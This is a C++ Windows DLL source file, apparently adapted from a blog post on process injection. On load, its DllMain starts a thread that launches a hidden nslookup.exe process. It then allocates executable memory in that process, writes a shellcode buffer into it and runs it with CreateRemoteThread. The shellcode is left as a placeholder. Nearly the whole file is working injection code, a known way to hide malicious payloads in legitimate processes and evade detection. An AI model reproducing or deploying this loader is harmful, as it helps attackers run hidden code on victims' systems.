// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <Windows.h>
#include <winternl.h>

/* original: https://sevrosecurity.com/2020/04/08/process-injection-part-1-createremotethread/
 * @thelikes
 */
void inject() {
    unsigned char shellcode[] = "...";

    // Create a 64-bit process: 
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    LPVOID allocation_start;
    SIZE_T allocation_size = sizeof(shellcode);
    LPCWSTR cmd;
    HANDLE hProcess, hThread;

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    cmd = TEXT("C:\\Windows\\syswow64\\nslookup.exe");

    if (!CreateProcess(
        cmd,							// Executable
        NULL,							// Command line
        NULL,							// Process handle not inheritable
        NULL,							// Thread handle not inheritable
        FALSE,							// Set handle inheritance to FALSE
        CREATE_NO_WINDOW,	            // Do Not Open a Window
        NULL,							// Use parent's environment block
        NULL,							// Use parent's starting directory 
        &si,			                // Pointer to STARTUPINFO structure
        &pi								// Pointer to PROCESS_INFORMATION structure (removed extra parentheses)
    )) {
        return;
    }
    WaitForSingleObject(pi.hProcess, 3000); // Allow nslookup 1 second to start/initialize. 

    // Inject into the 64-bit process:
    // HIGH-LEVEL WINDOWS API:
    allocation_start = VirtualAllocEx(pi.hProcess, NULL, allocation_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, allocation_start, shellcode, allocation_size, NULL);
    CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)allocation_start, NULL, 0, 0);

    return;
}

void go(HMODULE hMod) {
	inject();
}

// DllMain
// ------------------------------------------------------------------------

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
	HANDLE threadHandle;
	DWORD dwThread;

	switch (fdwReason) {
	case DLL_PROCESS_ATTACH:
		// Init Code here
		threadHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)go, hinstDLL, 0, NULL);
		CloseHandle(threadHandle);
		break;

	case DLL_THREAD_ATTACH:
		// Thread-specific init code here
		break;

	case DLL_THREAD_DETACH:
		// Thread-specific cleanup code here
		break;

	case DLL_PROCESS_DETACH:
		// Cleanup code here
		break;
	}

	// The return value is used for successful DLL_PROCESS_ATTACH
	return TRUE;
}